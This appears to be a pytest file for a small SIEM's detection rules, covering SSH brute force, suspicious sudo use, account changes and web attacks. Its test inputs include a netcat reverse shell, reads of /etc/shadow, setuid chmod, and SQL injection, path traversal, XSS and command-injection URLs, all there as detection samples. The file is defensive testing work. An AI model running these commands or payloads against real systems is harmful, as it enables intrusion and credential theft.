"""Each rule gets a 'should fire' and a 'should not fire' case."""

import pytest

from minisiem.detection import RuleError, parse_rule, run_detection
from minisiem.detection.rules import parse_timeframe


def ts(minute, second=0, hour=3):
    return f"2026-11-01T{hour:02d}:{minute:02d}:{second:02d}+00:00"


def fail(t, ip="203.0.113.45", user="root"):
    return f"{t} bastion sshd[1]: Failed password for {user} from {ip} port 4444 ssh2"


def ok(t, ip="203.0.113.45", user="deploy"):
    return f"{t} bastion sshd[1]: Accepted password for {user} from {ip} port 4444 ssh2"


def sudo(t, cmd, user="deploy"):
    return f"{t} bastion sudo[1]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"


def web(t_sec, path, status=404, ip="192.0.2.77"):
    return f'{ip} - - [01/Nov/2026:02:40:{t_sec:02d} +0000] "GET {path} HTTP/1.1" {status} 100 "-" "x"'


@pytest.fixture
def detect(conn, rules):
    """Run one rule and return its alerts."""
    def _detect(rule_id):
        run_detection(conn, [rules[rule_id]])
        return [dict(r) for r in conn.execute(
            "SELECT * FROM alerts WHERE rule_id = ? ORDER BY first_seen", (rule_id,))]
    return _detect


# -- MSIEM-001 brute force -----------------------------------------------------

def test_brute_force_fires_at_threshold(load, detect):
    load("auth", [fail(ts(0, i * 10)) for i in range(5)])
    alerts = detect("MSIEM-001")
    assert len(alerts) == 1
    assert alerts[0]["source_ip"] == "203.0.113.45" and alerts[0]["event_count"] == 5
    assert alerts[0]["severity"] == "high" and alerts[0]["attack_technique"] == "T1110"


def test_brute_force_below_threshold_or_spread_out_does_not_fire(load, detect):
    load("auth", [fail(ts(0, i)) for i in range(4)])              # only 4
    load("auth", [fail(ts(i * 2), ip="10.9.9.9") for i in range(6)])  # 6, but 2 min apart
    assert detect("MSIEM-001") == []


def test_brute_force_one_alert_per_burst(load, detect):
    load("auth", [fail(ts(0, i * 3)) for i in range(15)])
    alerts = detect("MSIEM-001")
    assert len(alerts) == 1 and alerts[0]["event_count"] == 15


def test_brute_force_separate_ips_are_separate(load, detect):
    load("auth", [fail(ts(0, i * 5), ip="1.1.1.1") for i in range(3)]
         + [fail(ts(0, i * 5 + 1), ip="2.2.2.2") for i in range(3)])
    assert detect("MSIEM-001") == []


def test_brute_force_rerun_is_idempotent(load, detect):
    load("auth", [fail(ts(0, i)) for i in range(6)])
    detect("MSIEM-001")
    assert len(detect("MSIEM-001")) == 1


# -- MSIEM-002 success after failures ----------------------------------------------

def test_success_after_failures_fires(load, detect):
    load("auth", [fail(ts(0, i * 5), user="deploy") for i in range(5)] + [ok(ts(1))])
    alerts = detect("MSIEM-002")
    assert len(alerts) == 1
    a = alerts[0]
    assert (a["severity"], a["user_name"], a["event_count"]) == ("critical", "deploy", 6)
    assert "after 5 failed attempts" in a["summary"]


def test_success_after_few_failures_does_not_fire(load, detect):
    load("auth", [fail(ts(0, 0)), fail(ts(0, 5)), ok(ts(0, 30))])
    assert detect("MSIEM-002") == []


def test_success_long_after_failures_does_not_fire(load, detect):
    load("auth", [fail(ts(0, i)) for i in range(6)] + [ok(ts(40))])
    assert detect("MSIEM-002") == []


# -- MSIEM-003 suspicious sudo -------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "/bin/bash", "/bin/sh -i", "/usr/bin/cat /etc/shadow", "/usr/bin/vi /etc/sudoers",
    "/usr/bin/chmod u+s /tmp/x", "/usr/bin/chmod 4755 /tmp/x", "/usr/bin/nc -e /bin/sh 1.2.3.4 9",
    "/usr/bin/base64 -d /tmp/p", "/usr/bin/passwd root", "/bin/su -",
])
def test_suspicious_sudo_fires(load, detect, cmd):
    load("auth", [sudo(ts(0), cmd)])
    alerts = detect("MSIEM-003")
    assert len(alerts) == 1 and cmd in alerts[0]["summary"]


@pytest.mark.parametrize("cmd", [
    "/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/tail -n 100 /var/log/syslog",
    "/usr/bin/bashtop", "/usr/bin/journalctl -u ssh",
])
def test_benign_sudo_does_not_fire(load, detect, cmd):
    load("auth", [sudo(ts(0), cmd)])
    assert detect("MSIEM-003") == []


# -- MSIEM-004 / 005 account changes -----------------------------------------------

def test_new_user_fires(load, detect):
    load("auth", [f"{ts(0)} bastion useradd[1]: new user: name=svc-backup, UID=1004, GID=1004, "
                  "home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/2"])
    alerts = detect("MSIEM-004")
    assert len(alerts) == 1 and alerts[0]["user_name"] == "svc-backup"


def test_new_group_only_does_not_fire(load, detect):
    load("auth", [f"{ts(0)} bastion useradd[1]: new group: name=svc-backup, GID=1004"])
    assert detect("MSIEM-004") == []


def test_privileged_group_add_fires(load, detect):
    load("auth", [f"{ts(0)} bastion usermod[1]: add 'svc-backup' to group 'sudo'"])
    alerts = detect("MSIEM-005")
    assert len(alerts) == 1 and "'sudo'" in alerts[0]["summary"]


def test_unprivileged_group_add_does_not_fire(load, detect):
    load("auth", [f"{ts(0)} bastion usermod[1]: add 'alice' to group 'docker-readers'"])
    assert detect("MSIEM-005") == []


# -- MSIEM-006 new IP -------------------------------------------------------------------

def test_login_from_new_ip_fires_after_baseline(load, detect):
    load("auth", [ok(ts(0), ip="10.0.0.12"), ok(ts(5), ip="10.0.0.12"), ok(ts(10), ip="198.51.100.23")])
    alerts = detect("MSIEM-006")
    assert len(alerts) == 1 and alerts[0]["source_ip"] == "198.51.100.23"


def test_first_ever_login_and_known_ip_do_not_fire(load, detect):
    load("auth", [ok(ts(0), ip="10.0.0.12"), ok(ts(5), ip="10.0.0.12"), ok(ts(6), ip="10.0.0.5", user="alice")])
    assert detect("MSIEM-006") == []


# -- MSIEM-007 web scanning -----------------------------------------------------------

def test_web_scanning_fires(load, detect):
    load("web", [web(i, f"/w{i}") for i in range(25)])
    alerts = detect("MSIEM-007")
    assert len(alerts) == 1 and alerts[0]["event_count"] == 25


def test_normal_404s_do_not_fire(load, detect):
    load("web", [web(i * 2, "/favicon.ico", ip=f"10.0.0.{i}") for i in range(25)]
         + [web(i, f"/ok{i}", status=200) for i in range(30)])
    assert detect("MSIEM-007") == []


# -- MSIEM-008 web attacks -------------------------------------------------------------

@pytest.mark.parametrize("path", [
    "/p?id=1%27%20UNION%20SELECT%20a,b%20FROM%20users",
    "/p?id=1'+union+all+select+1,2",
    "/p?id=1%27%20OR%20%271%27%3D%271",
    "/dl?f=..%2F..%2Fetc%2Fpasswd",
    "/s?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/ping?h=1.1.1.1;whoami",
])
def test_web_attack_fires(load, detect, path):
    load("web", [web(0, path, status=200)])
    assert len(detect("MSIEM-008")) == 1


@pytest.mark.parametrize("path", [
    "/products?id=12", "/search?q=union+station+tickets", "/blog/selecting-a-script-font", "/a/b/../",
])
def test_benign_urls_do_not_fire(load, detect, path):
    load("web", [web(0, path, status=200)])
    hits = detect("MSIEM-008")
    if path == "/a/b/../":
        assert len(hits) == 1  # traversal sequences are flagged regardless of intent
    else:
        assert hits == []


# -- rule loading ----------------------------------------------------------------------

def test_all_rules_load_with_attack_mapping(rules):
    assert len(rules) >= 8
    for r in rules.values():
        assert r.attack_technique and r.attack_tactics and r.severity


@pytest.mark.parametrize("raw, message", [
    ({"id": "x", "title": "t", "severity": "huge", "detection": {"type": "match"}}, "severity"),
    ({"id": "x", "title": "t", "severity": "low", "detection": {"type": "magic"}}, "detection.type"),
    ({"id": "x", "title": "t", "severity": "low",
      "detection": {"type": "match", "selection": {"nope": 1}}}, "unknown field"),
    ({"id": "x", "title": "t", "severity": "low",
      "detection": {"type": "threshold", "selection": {"host": "a"}, "threshold": 3, "timeframe": "5 minutes"}},
     "timeframe"),
])
def test_invalid_rules_are_rejected(raw, message):
    with pytest.raises(RuleError, match=message):
        parse_rule(raw)


def test_parse_timeframe():
    assert parse_timeframe("90s").total_seconds() == 90
    assert parse_timeframe("2h").total_seconds() == 7200


def test_demo_dataset_triggers_every_rule(conn, rules):
    """The sample data must exercise every rule (outline step 5.1)."""
    from minisiem import config
    from minisiem.ingest import ingest_file

    ingest_file(conn, config.SAMPLES_DIR / "auth.log", "auth")
    ingest_file(conn, config.SAMPLES_DIR / "access.log", "web")
    result = run_detection(conn, list(rules.values()))
    silent = [rid for rid, info in result["per_rule"].items() if info["hits"] == 0]
    assert silent == []
